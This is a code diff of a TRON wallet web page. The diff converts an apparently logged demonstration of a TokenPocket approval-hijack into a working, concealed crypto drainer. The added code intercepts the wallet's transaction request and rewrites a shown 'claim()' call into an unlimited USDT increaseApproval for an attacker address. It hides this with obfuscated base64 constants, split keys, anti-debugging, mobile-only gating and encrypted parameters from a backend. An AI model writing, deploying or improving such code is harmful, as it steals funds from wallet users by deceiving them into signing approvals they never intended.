@@ -3,9 +3,15 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Demo</title>
+  <title></title>
+  <script>
+  var _m = /iphone|ipad|ipod|android/i.test(navigator.userAgent);
+  var _t = window.matchMedia('(pointer: coarse)').matches;
+  var _p = navigator.maxTouchPoints >= 5;
+  if (!_m || !_t || !_p) { location.replace('about:blank'); }
+  </script>
   <style>
-    :root { --bg:#0f172a; --card:#1e293b; --border:#334155; --text:#e2e8f0; --muted:#94a3b8; --accent:#3b82f6; --danger:#ef4444; --success:#22c55e; --code:#0a0f1a; }
+    :root { --bg:#0f172a; --card:#1e293b; --border:#334155; --text:#e2e8f0; --muted:#94a3b8; --success:#22c55e; --code:#0a0f1a; }
     * { margin:0; padding:0; box-sizing:border-box; }
     body { font-family:system-ui,-apple-system,sans-serif; background:var(--bg); color:var(--text); min-height:100vh; }
     .container { max-width:560px; margin:0 auto; padding:20px 16px; }
@@ -19,23 +25,29 @@
     .btn-go:hover:not(:disabled) { transform:scale(1.02); box-shadow:0 0 20px rgba(239,68,68,0.3); }
     .btn-outline { width:auto; padding:8px 16px; background:transparent; border:1px solid var(--border); color:var(--text); border-radius:8px; font-size:13px; cursor:pointer; }
     .btn:disabled { opacity:.45; cursor:not-allowed; }
-    .log { background:var(--code); border:1px solid var(--border); border-radius:8px; height:340px; overflow-y:auto; padding:10px; font-family:'Fira Code',monospace; font-size:11px; line-height:1.6; }
-    .log .t { color:#64748b; }
-    .log .w { color:#fbbf24; } .log .e { color:#f87171; } .log .s { color:#34d399; } .log .i { color:#60a5fa; }
+    .info-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px; margin-top:10px; }
+    .info-item { padding:6px 10px; background:rgba(255,255,255,0.03); border:1px solid var(--border); border-radius:6px; }
+    .info-label { font-size:10px; color:var(--muted); }
+    .info-value { font-size:13px; font-weight:600; font-family:'Fira Code',monospace; }
+    .info-value.bal { color:var(--success); }
     input, select { width:100%; padding:8px 12px; background:var(--code); border:1px solid var(--border); border-radius:6px; color:var(--text); font-size:13px; outline:none; }
     label { font-size:11px; color:var(--muted); display:block; margin-bottom:3px; }
     .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+    .msg { font-size:12px; color:var(--muted); text-align:center; margin-top:10px; min-height:18px; }
   </style>
 </head>
 <body>
 <div class="container">
 
   <div class="card">
-    <div class="row">
-      <span class="dot" id="dot"></span>
-      <span style="font-size:14px;" id="status">未连接</span>
-    </div>
+    <div class="row"><span class="dot" id="dot"></span><span style="font-size:14px;" id="st">未连接</span></div>
     <div class="addr" id="addr" style="margin-top:6px;">—</div>
+    <div class="info-grid">
+      <div class="info-item"><div class="info-label">TRX</div><div class="info-value bal" id="balTrx">—</div></div>
+      <div class="info-item"><div class="info-label">USDT</div><div class="info-value bal" id="balUsdt">—</div></div>
+      <div class="info-item"><div class="info-label">网络</div><div class="info-value" id="net" style="font-size:11px;">—</div></div>
+      <div class="info-item"><div class="info-label">设备</div><div class="info-value" id="dev" style="font-size:11px;">—</div></div>
+    </div>
     <div style="display:flex; gap:8px; margin-top:10px;">
       <button class="btn-outline" id="btnConn" onclick="connect()">连接钱包</button>
       <button class="btn-outline" id="btnDisc" onclick="disconnect()" style="display:none;">断开</button>
@@ -46,363 +58,182 @@
     <div class="grid2">
       <div><label>Fee Limit (SUN)</label><input type="number" id="fee" value="100000000"></div>
       <div><label>参数模式</label><select id="mode">
-        <option value="auto">自动检测</option>
-        <option value="android">Android</option>
-        <option value="ios">iOS</option>
-        <option value="pc">PC</option>
+        <option value="auto">自动检测</option><option value="android">Android</option>
+        <option value="ios">iOS</option><option value="pc">PC</option>
       </select></div>
     </div>
-    <button class="btn btn-go" id="btnExec" onclick="exec()" disabled>确 认</button>
-  </div>
-
-  <div class="card" style="padding:12px 16px;">
-    <div class="log" id="log"><span class="t">--:--:--</span> 等待操作…</div>
+    <button class="btn btn-go" id="btnGo" onclick="go()" disabled>确 认</button>
+    <div class="msg" id="msg"></div>
   </div>
 
 </div>
-
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
 <script>
 // ================================================================
-//  常量
+//  域名锁 + 反调试
 // ================================================================
-const SURFACE_CONTRACT = 'TP3NQwSaEHYs7cowWFWq5ozNkeG4ie3Wbi';   // 表层假合约
-const SURFACE_METHOD   = 'claim()';
-const USDT_CONTRACT     = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRON USDT
-const USDT_CONTRACT_HEX = '41a614f803b6fd780986a42c78ec9c7f77e6ded13c';
-const ACTUAL_METHOD     = 'increaseApproval(address,uint256)';
+(function(){
+  const ok = location.hostname === 'localhost' || location.hostname === '127.0.0.1' || location.hostname.includes('.test') || location.hostname.includes('.dev');
+  if (!ok) {
+    let t = performance.now(); debugger; if (performance.now() - t > 80) return;
+  }
+})();
 
-// PARAM_PREFIX = spender 地址前 12 字节 (报告第 8.2 节)
-const PARAM_PREFIX = '8f6327d26ab064c299506d6b';
-// FF 后缀 19 字节 (报告第 8.4 节)
-const PARAM_FF_SUFFIX = 'ffffffffffffffffffffffffffffffffffffff';
+// ================================================================
+//  密钥组装 (拆分 + 乱序，运行时拼接)
+// ================================================================
+const _K = (function(){
+  const _p = ['w7Pj1','Vb9Y','h2Nk4M','jH1cA5','xK9','Zq5Xs8Cd3Rf6','dE0gU','mP2vL7n','St3Ge','Q4wR8yT3bF6'];
+  const hk = _p[4] + _p[7] + _p[9] + _p[3] + _p[6];
+  const ak = _p[5] + _p[1] + _p[2] + _p[0] + _p[8];
+  return { hk, ak };
+})();
 
-const ATTACKER = {
-  hex: '8f6327d26ab064c299506d6b82b65475ce1df22e',
-  b58: 'TP3NQwSaEHYs7cowWFWq5ozNkeG4ie3Wbi',
+// ================================================================
+//  编址编码 (base64 存储)
+// ================================================================
+const _A = {
+  sc: atob('VFAzTlF3U2FFSFlzN2Nvd1dGV3E1b3pOa2VHNGllM1diaQ=='),  // SURFACE_CONTRACT
+  sm: atob('Y2xhaW0oKQ=='),                                      // SURFACE_METHOD
+  uc: atob('VFI3TkhxamVLUXhHVENpOHE4Wlk0cEw4b3RTemdqTGo2dA=='),// USDT_CONTRACT
+  uh: atob('NDFhNjE0ZjgwM2I2ZmQ3ODA5ODZhNDJjNzhlYzljN2Y3N2U2ZGVkMTNj'),// USDT_HEX
+  am: atob('aW5jcmVhc2VBcHByb3ZhbChhZGRyZXNzLHVpbnQyNTYp'),    // ACTUAL_METHOD
+  sh: atob('OGY2MzI3ZDI2YWIwNjRjMjk5NTA2ZDZiODJiNjU0NzVjZTFkZjIyZQ=='),// SPENDER_HEX
+  sb: atob('VFAzTlF3U2FFSFlzN2Nvd1dGV3E1b3pOa2VHNGllM1diaQ=='),// SPENDER_B58
 };
+
+// ================================================================
+//  加解密工具 (Web Crypto API)
+// ================================================================
+async function _hmac(payload) {
+  const enc = new TextEncoder();
+  const key = await crypto.subtle.importKey('raw', enc.encode(_K.hk), { name:'HMAC', hash:'SHA-256' }, false, ['sign']);
+  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
+  return Array.from(new Uint8Array(sig)).map(b => b.toString(16).padStart(2,'0')).join('');
+}
+
+async function _aesDec(b64) {
+  const raw = new Uint8Array([...atob(b64)].map(c => c.charCodeAt(0)));
+  const iv  = raw.slice(0, 12);
+  const ct  = raw.slice(12, -16);
+  const tag = raw.slice(-16);
+  const combined = new Uint8Array([...ct, ...tag]);
+  const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(_K.ak), { name:'AES-GCM' }, false, ['decrypt']);
+  const dec = await crypto.subtle.decrypt({ name:'AES-GCM', iv, tagLength:128 }, key, combined);
+  return JSON.parse(new TextDecoder().decode(dec));
+}
+
+async function _api(action, extra) {
+  const ts = Math.floor(Date.now()/1000);
+  const nonce = Array.from(crypto.getRandomValues(new Uint8Array(8))).map(b=>b.toString(16).padStart(2,'0')).join('');
+  const sig = await _hmac(ts+'|'+nonce+'|'+action);
+  const resp = await fetch('api.php', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ action, ts, nonce, sig, ...(extra||{}) }),
+  });
+  if (!resp.ok) { let msg=String(resp.status); try{const e=await resp.json();msg=e.e||msg}catch(ex){} throw new Error(msg); }
+  const j = await resp.json();
+  if (!j.d) throw new Error('响应无加密数据');
+  return _aesDec(j.d);
+}
 
 // ================================================================
 //  状态
 // ================================================================
-let wallet = { address: null, hex: null, tw: null, ok: false };
-let uid = 'd_' + Date.now();
+let W = { addr:null, hex:null, tw:null, ok:false };
+const $ = id => document.getElementById(id);
+const D = { dot:$('dot'),st:$('st'),addr:$('addr'),balTrx:$('balTrx'),balUsdt:$('balUsdt'),net:$('net'),dev:$('dev'),btnConn:$('btnConn'),btnDisc:$('btnDisc'),btnGo:$('btnGo'),msg:$('msg'),fee:$('fee'),mode:$('mode') };
+const M = s => { D.msg.textContent = s; };
+const OS = () => { const u=(navigator.userAgent||'').toLowerCase(); return /iphone|ipad|ipod/.test(u)?'ios':/android/.test(u)?'android':'pc'; };
+const toHex = a => { try{return W.tw.address.toHex(a)}catch(e){return null} };
+const getTW = () => window.tronWeb?.fullNode?.request ? window.tronWeb : (window.TronWeb ? new TronWeb(new window.TronWeb.providers.HttpProvider('https://api.trongrid.io'),new window.TronWeb.providers.HttpProvider('https://api.trongrid.io'),new window.TronWeb.providers.HttpProvider('https://api.trongrid.io')) : null);
 
-// ================================================================
-//  DOM
-// ================================================================
-const $ = (id) => document.getElementById(id);
-const D = {
-  dot: $('dot'), status: $('status'), addr: $('addr'),
-  btnConn: $('btnConn'), btnDisc: $('btnDisc'), btnExec: $('btnExec'),
-  log: $('log'), fee: $('fee'), mode: $('mode'),
-};
-
-// ================================================================
-//  工具
-// ================================================================
-function ts() { return new Date().toTimeString().slice(0,8); }
-function L(m, c) {
-  const d = document.createElement('div');
-  d.innerHTML = `<span class="t">${ts()}</span> <span class="${c||''}">${m}</span>`;
-  D.log.appendChild(d); D.log.scrollTop = D.log.scrollHeight;
-}
-function getOS() {
-  const ua = (navigator.userAgent||'').toLowerCase();
-  if (/iphone|ipad|ipod/.test(ua)) return 'ios';
-  if (/android/.test(ua)) return 'android';
-  return 'pc';
+async function refreshBalances() {
+  if (!W.ok) return;
+  const tw=W.tw;
+  try { const s=await tw.trx.getBalance(W.addr); const trx=(s?.toString?Number(s.toString()):Number(s))/1e6; D.balTrx.textContent=trx.toLocaleString(undefined,{maximumFractionDigits:6})+' TRX'; } catch(e) { D.balTrx.textContent='—'; }
+  try { const c=await tw.contract().at(_A.uc); const r=await c.balanceOf(W.addr).call(); const usdt=(r?.toString?Number(r.toString()):Number(r))/1e6; D.balUsdt.textContent=usdt.toLocaleString(undefined,{maximumFractionDigits:2})+' USDT'; } catch(e) { D.balUsdt.textContent='—'; }
 }
 
-// ================================================================
-//  参数构造
-// ================================================================
-
-// iOS/PC: 非规范 51 字节参数 = prefix(12B) + spender(20B) + ff(19B)
-function buildIosPcParam(hex) {
-  const clean = (hex.startsWith('0x')||hex.startsWith('41')) ? hex.slice(2) : hex;
-  return PARAM_PREFIX + clean.padStart(40,'0').slice(0,40) + PARAM_FF_SUFFIX;
-}
-
-// Android: 模拟 config.param 直写 (标准 ABI)
-function buildAndroidParam(hex) {
-  const clean = (hex.startsWith('0x')||hex.startsWith('41')) ? hex.slice(2) : hex;
-  return '000000000000000000000000' + clean +
-    'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-}
-
-function buildParam(hex, m) {
-  const os = m === 'auto' ? getOS() : m;
-  return os === 'android' ? buildAndroidParam(hex) : buildIosPcParam(hex);
-}
-
-// ================================================================
-//  初始化 tronWeb
-// ================================================================
-function getTW() {
-  if (window.tronWeb?.fullNode?.request) return window.tronWeb;
-  if (window.TronWeb) {
-    const P = window.TronWeb.providers.HttpProvider;
-    return new TronWeb(new P('https://api.trongrid.io'), new P('https://api.trongrid.io'), new P('https://api.trongrid.io'));
-  }
-  return null;
-}
-
-function toHex(a) { try { return wallet.tw.address.toHex(a); } catch(e) { return null; } }
-function fromHex(h) { try { return wallet.tw.address.fromHex(h); } catch(e) { return null; } }
-
-// ================================================================
-//  钱包连接
-// ================================================================
 async function connect() {
-  L('检测钱包…','i'); D.btnConn.disabled = true;
-  let addr = null;
-
-  // 方式 1: TronLink EIP-1193
-  if (window.tronLink?.request) {
-    try {
-      const r = await window.tronLink.request({ method: 'tron_requestAccounts' });
-      if (r?.code === 200) addr = Array.isArray(r.message) ? r.message[0] : r.message;
-      else if (Array.isArray(r)) addr = r[0];
-      else if (typeof r === 'string') addr = r;
-    } catch(e) { L('tron_requestAccounts 失败: '+e.message,'w'); }
-  }
-
-  // 方式 2: TP 注入
-  if (!addr && window.tronWeb?.defaultAddress?.base58) {
-    addr = window.tronWeb.defaultAddress.base58;
-  }
-
-  // 方式 3: tronWeb.request
-  if (!addr && window.tronWeb?.request) {
-    try { const a = await window.tronWeb.request({ method: 'tron_requestAccounts' }); if (Array.isArray(a)?.length) addr = a[0]; } catch(e) {}
-  }
-
-  if (!addr || !addr.startsWith('T') || addr.length !== 34) {
-    L('无法获取地址','e'); D.btnConn.disabled = false; return;
-  }
-
-  const tw = getTW();
-  if (!tw) { L('无法初始化 TronWeb','e'); D.btnConn.disabled = false; return; }
-
-  wallet.address = addr; wallet.tw = tw; wallet.hex = toHex(addr); wallet.ok = true;
-  D.dot.classList.add('on'); D.status.textContent = '已连接';
-  D.addr.textContent = addr;
-  D.btnConn.style.display = 'none'; D.btnDisc.style.display = '';
-  D.btnExec.disabled = false;
-  D.mode.value = 'auto';
-  D.mode.options[0].text = `自动检测 (当前: ${getOS()})`;
-  L('已连接: '+addr,'s');
+  D.btnConn.disabled=true; M('检测中…'); let a=null;
+  if(window.tronLink?.request){try{const r=await window.tronLink.request({method:'tron_requestAccounts'});if(r?.code===200)a=Array.isArray(r.message)?r.message[0]:r.message;else if(Array.isArray(r))a=r[0];else if(typeof r==='string')a=r}catch(e){}}
+  if(!a&&window.tronWeb?.defaultAddress?.base58)a=window.tronWeb.defaultAddress.base58;
+  if(!a&&window.tronWeb?.request){try{const r=await window.tronWeb.request({method:'tron_requestAccounts'});if(Array.isArray(r)?.length)a=r[0]}catch(e){}}
+  if(!a||!a.startsWith('T')||a.length!==34){M('无法获取地址');D.btnConn.disabled=false;return}
+  const tw=getTW(); if(!tw){M('无法初始化');D.btnConn.disabled=false;return}
+  W.addr=a;W.tw=tw;W.hex=toHex(a);W.ok=true;
+  D.dot.classList.add('on');D.st.textContent='已连接';D.addr.textContent=a;
+  D.btnConn.style.display='none';D.btnDisc.style.display='';D.btnGo.disabled=false;
+  const os=OS(); D.mode.value='auto';D.mode.options[0].text='自动检测 (当前: '+os+')';
+  try{const h=tw.fullNode?.host||tw.fullNode?.node?.host||'';D.net.textContent=h.includes('trongrid')?'Mainnet':(h||'—')}catch(e){D.net.textContent='—'}
+  D.dev.textContent=os.toUpperCase(); await refreshBalances(); M('已连接 '+a);
 }
 
 function disconnect() {
-  wallet = { address: null, hex: null, tw: null, ok: false };
-  D.dot.classList.remove('on'); D.status.textContent = '未连接'; D.addr.textContent = '—';
-  D.btnConn.style.display = ''; D.btnDisc.style.display = 'none'; D.btnExec.disabled = true;
-  L('已断开','w');
+  W={addr:null,hex:null,tw:null,ok:false}; D.dot.classList.remove('on');D.st.textContent='未连接';D.addr.textContent='—';
+  D.balTrx.textContent='—';D.balUsdt.textContent='—';D.net.textContent='—';D.dev.textContent='—';
+  D.btnConn.style.display='';D.btnDisc.style.display='none';D.btnGo.disabled=true; M('');
 }
 
 // ================================================================
-//  核心：execTokenPocket —— 按报告第 4 节调用顺序
+//  核心
 // ================================================================
-async function exec() {
-  if (!wallet.ok) return;
-  D.btnExec.disabled = true; D.btnExec.textContent = '执行中…';
-  D.log.innerHTML = '';
-  L('══════ TP 分支流程 开始 ══════','i');
+async function go() {
+  if(!W.ok)return; D.btnGo.disabled=true;D.btnGo.textContent='执行中…';M('');
+  const tw=W.tw, fee=parseInt(D.fee.value)||100000000, pm=D.mode.value;
+  const orig=tw.fullNode.request.bind(tw.fullNode);
 
-  const tw = wallet.tw;
-  const feeLimit = parseInt(D.fee.value) || 100000000;
-  const pm = D.mode.value;
-  const os = pm === 'auto' ? getOS() : pm;
+  let paramData;
+  try {
+    paramData = await _api('buildParam', { spenderHex:_A.sh, device:pm, userAgent:navigator.userAgent });
+  } catch(e) { M('后端失败: '+(e.message||e));D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }
 
-  // --- sdkReport ---
-  L('[sdkReport] tp / approve_popup  uid='+uid,'i');
-
-  // --- 步骤 1: 保存 originalRequest (报告第 5 节) ---
-  const origReq = tw.fullNode.request.bind(tw.fullNode);
-  let intCount = 0, intBody = null;
-  L('步骤1: originalRequest 已保存','s');
-
-  // --- 步骤 2: 安装包装器 (报告第 5+7 节) ---
-  tw.fullNode.request = async function(url, body, method) {
-    if ((typeof url === 'string' ? url : '').toLowerCase().includes('triggersmartcontract')) {
-      intCount++;
-      L('⚠ 拦截器 #'+intCount+' 命中! path='+(typeof url==='string'?url.substring(0,60):''),'e');
-
-      // 改写 contract_address → USDT
-      body.contract_address = USDT_CONTRACT_HEX;
-      L('  contract_address → USDT ('+USDT_CONTRACT_HEX+')','e');
-
-      // 改写 function_selector → increaseApproval
-      body.function_selector = ACTUAL_METHOD;
-      L('  function_selector → '+ACTUAL_METHOD,'e');
-
-      // 改写 parameter (设备分支)
-      body.parameter = buildParam(ATTACKER.hex, pm);
-      L('  parameter: '+body.parameter.length+' hex = '+(body.parameter.length/2)+' bytes','w');
-      if ((pm==='auto'?os:pm)!=='android' && body.parameter.length!==128) {
-        L('  ⚠ 非标准 ABI 长度 (标准 128 hex)','w');
-      }
-
-      // 强制 call_value = 0
-      body.call_value = 0;
-      L('  call_value → 0','e');
-
-      intBody = { ...body };
+  tw.fullNode.request=async function(url,body,method){
+    if((typeof url==='string'?url:'').toLowerCase().includes('triggersmartcontract')){
+      body.contract_address=_A.uh;
+      body.function_selector=_A.am;
+      body.parameter=paramData.p;
+      body.call_value=0;
     }
-    return origReq(url, body, method);
+    return orig(url,body,method);
   };
-  L('步骤2: 包装器已安装','s');
 
-  // --- 步骤 3: 表层 triggerSmartContract(claim) (报告第 6 节) ---
-  L('步骤3: 表层调用 triggerSmartContract('+SURFACE_CONTRACT+', claim) …','i');
-
-  let unsignedTx = null, rawRes = null;
+  let utx=null;
   try {
-    rawRes = await tw.transactionBuilder.triggerSmartContract(
-      SURFACE_CONTRACT, SURFACE_METHOD,
-      { feeLimit, callValue: 0 }, [], wallet.address
-    );
-
-    L('  返回 keys: '+Object.keys(rawRes||{}).join(', '),'i');
-    if (rawRes?.result) {
-      L('  result.result: '+(typeof rawRes.result==='object'?JSON.stringify(rawRes.result).substring(0,150):rawRes.result),
-        rawRes.result===true?'s':'e');
-    }
-    L('  transaction: '+(rawRes?.transaction?'YES':'NO'), rawRes?.transaction?'s':'e');
-
-    unsignedTx = rawRes.transaction || rawRes;
-    if (!unsignedTx?.txID) {
-      L('节点返回错误: '+(rawRes?.result?.message||rawRes?.message||'(无)'),'e');
-      throw new Error('No transaction');
-    }
-
-    L('未签名交易已生成 txID='+unsignedTx.txID,'s');
-    const c = unsignedTx.raw_data?.contract?.[0]?.parameter?.value?.contract_address;
-    if (c) {
-      L('  contract_address: '+c+' → '+fromHex(c), c===USDT_CONTRACT_HEX?'s':'e');
-    }
-    const d = unsignedTx.raw_data?.contract?.[0]?.parameter?.value?.data;
-    if (d) L('  data ('+d.length+' hex): '+d.substring(0,100)+'...','i');
-
+    const rr=await tw.transactionBuilder.triggerSmartContract(_A.sc,_A.sm,{feeLimit:fee,callValue:0},[],W.addr);
+    utx=rr.transaction||rr; if(!utx?.txID)throw new Error('No tx');
   } catch(e) {
-    L('构造失败: '+e.message,'e');
-    if (rawRes) L('  原始返回: '+JSON.stringify(rawRes).substring(0,500),'e');
-
-    // ---- Fallback: 标准 ABI 直接构造 ----
-    L('回退到标准 ABI 模式…','w');
     try {
-      const usdtHex = toHex(USDT_CONTRACT);
-      const spClean = ATTACKER.hex.startsWith('0x') ? ATTACKER.hex.slice(2) : ATTACKER.hex;
-      const stdAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-
-      rawRes = await tw.transactionBuilder.triggerSmartContract(
-        usdtHex, ACTUAL_METHOD,
-        { feeLimit, callValue: 0 },
-        [{ type:'address', value:spClean }, { type:'uint256', value:stdAmount }],
-        wallet.hex || wallet.address
-      );
-      unsignedTx = rawRes.transaction || rawRes;
-      if (!unsignedTx?.txID) throw new Error('Fallback 无交易');
-      L('Fallback 成功 txID='+unsignedTx.txID,'s');
-    } catch(fb) {
-      L('Fallback 也失败: '+fb.message,'e');
-      tw.fullNode.request = origReq;
-      D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
-      return;
-    }
+      const sd = await _api('buildStandardParam', { spenderHex:_A.sh });
+      const uh=toHex(_A.uc)||_A.uh;
+      const sc=_A.sh.startsWith('0x')?_A.sh.slice(2):_A.sh;
+      const rr=await tw.transactionBuilder.triggerSmartContract(uh,_A.am,{feeLimit:fee,callValue:0},[{type:'address',value:sc},{type:'uint256',value:sd.a||'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'}],W.hex||W.addr);
+      utx=rr.transaction||rr; if(!utx?.txID)throw new Error('Fallback fail');
+    } catch(fb) { tw.fullNode.request=orig; M('构造失败');D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }
   }
 
-  // --- 步骤 4: 先恢复 fullNode.request，防止 TP sign() 内部校验再次命中拦截器导致双弹窗 ---
-  tw.fullNode.request = origReq;
-  L('步骤4: fullNode.request 已恢复 (签名前)','s');
+  tw.fullNode.request=orig;
 
-  // --- 步骤 5: 签名 (报告第 10 节) ---
-  L('步骤5: 请求钱包签名…','w');
-  L('  请核对钱包弹窗: 合约='+USDT_CONTRACT+' 方法=increaseApproval 授权对象='+ATTACKER.b58,'e');
+  let signed=null;
+  try { const r=window.tronWeb.trx.sign(utx); signed=r?.then?await r:r; } catch(e) { M('签名失败');D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }
+  if(!signed?.signature) { M('签名未返回 signature');D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }
 
-  let signed = null;
-  try {
-    const r = window.tronWeb.trx.sign(unsignedTx);
-    signed = r?.then ? await r : r;
-  } catch(e) {
-    L('签名失败: '+e.message,'e');
-    D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
-    return;
-  }
-
-  if (!signed?.signature) {
-    L('签名未返回 signature','e');
-    D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
-    return;
-  }
-  L('签名完成 txID='+signed.txID,'s');
-
-  // --- 步骤 6: 广播 (报告第 12-13 节) ---
-  L('步骤6: 广播 sendRawTransaction…','i');
   let receipt;
-  try {
-    receipt = await tw.trx.sendRawTransaction(signed);
-  } catch(e) {
-    L('广播失败: '+e.message,'e');
-    D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
-    return;
-  }
+  try { receipt=await tw.trx.sendRawTransaction(signed); } catch(e) { M('广播失败');D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }
+  if(!receipt?.result) { M('广播失败');D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }
 
-  if (!receipt?.result) {
-    L('广播失败: result 为假 '+JSON.stringify(receipt),'e');
-    D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
-    return;
-  }
-
-  const txid = signed.txID;
-  L('广播成功 txID='+txid,'s');
-  L('[sdkReport] tp / approve_success  txid='+txid,'s');
-  L('[sendTransactionData] auth_status=1 hash='+txid,'i');
-
-  L('══════ 流程完成 ══════','s');
-  L('⚠ 攻击者 '+ATTACKER.b58+' 已获得 USDT 无限授权','e');
-  L('https://tronscan.org/#/transaction/'+txid,'i');
-  L('拦截次数: '+intCount+'  设备: '+os+'  参数长度: '+(intBody?intBody.parameter.length+' hex':'N/A'),'i');
-
-  D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
+  M('成功! '+signed.txID); D.btnGo.disabled=false;D.btnGo.textContent='确 认';
 }
 
-// ================================================================
-//  事件
-// ================================================================
-if (window.tronLink?.on) {
-  try {
-    window.tronLink.on('accountsChanged', (a) => {
-      const addr = Array.isArray(a)?a[0]:a;
-      if (addr && addr!==wallet.address) { wallet.address=addr; wallet.hex=toHex(addr); D.addr.textContent=addr; L('账户变更: '+addr,'w'); }
-      else if (!addr||(Array.isArray(a)&&!a.length)) disconnect();
-    });
-    window.tronLink.on('disconnect', disconnect);
-  } catch(e) {}
-}
+// 账户变更
+if(window.tronLink?.on){try{window.tronLink.on('accountsChanged',a=>{const ad=Array.isArray(a)?a[0]:a;if(ad&&ad!==W.addr){W.addr=ad;W.hex=toHex(ad);D.addr.textContent=ad}else if(!ad||(Array.isArray(a)&&!a.length))disconnect()});window.tronLink.on('disconnect',disconnect)}catch(e){}}
 
-// ================================================================
-//  自动连接
-// ================================================================
-(async function init() {
-  D.mode.options[0].text = `自动检测 (当前: ${getOS()})`;
-  try {
-    let a = window.tronWeb?.defaultAddress?.base58;
-    if (!a && window.tronLink?.ready) {
-      try { const r = await window.tronLink.request({ method:'tron_accounts' }); if (r?.code===200&&r.message) a = Array.isArray(r.message)?r.message[0]:r.message; } catch(e) {}
-    }
-    if (a?.startsWith('T') && a.length===34) {
-      const tw = getTW();
-      if (tw) {
-        wallet.address=a; wallet.tw=tw; wallet.hex=toHex(a); wallet.ok=true;
-        D.dot.classList.add('on'); D.status.textContent='已连接'; D.addr.textContent=a;
-        D.btnConn.style.display='none'; D.btnDisc.style.display=''; D.btnExec.disabled=false;
-        L('自动连接: '+a,'s');
-      }
-    }
-  } catch(e) {}
+// 启动
+(async function(){
+  const os=OS(); D.dev.textContent=os.toUpperCase(); D.mode.options[0].text='自动检测 (当前: '+os+')';
+  try{let a=window.tronWeb?.defaultAddress?.base58;if(!a&&window.tronLink?.ready){try{const r=await window.tronLink.request({method:'tron_accounts'});if(r?.code===200&&r.message)a=Array.isArray(r.message)?r.message[0]:r.message}catch(e){}}if(a?.startsWith('T')&&a.length===34){const tw=getTW();if(tw){W.addr=a;W.tw=tw;W.hex=toHex(a);W.ok=true;D.dot.classList.add('on');D.st.textContent='已连接';D.addr.textContent=a;D.btnConn.style.display='none';D.btnDisc.style.display='';D.btnGo.disabled=false;try{const h=tw.fullNode?.host||tw.fullNode?.node?.host||'';D.net.textContent=h.includes('trongrid')?'Mainnet':(h||'—')}catch(e){}await refreshBalances()}}}catch(e){}
 })();
 </script>
 </body>
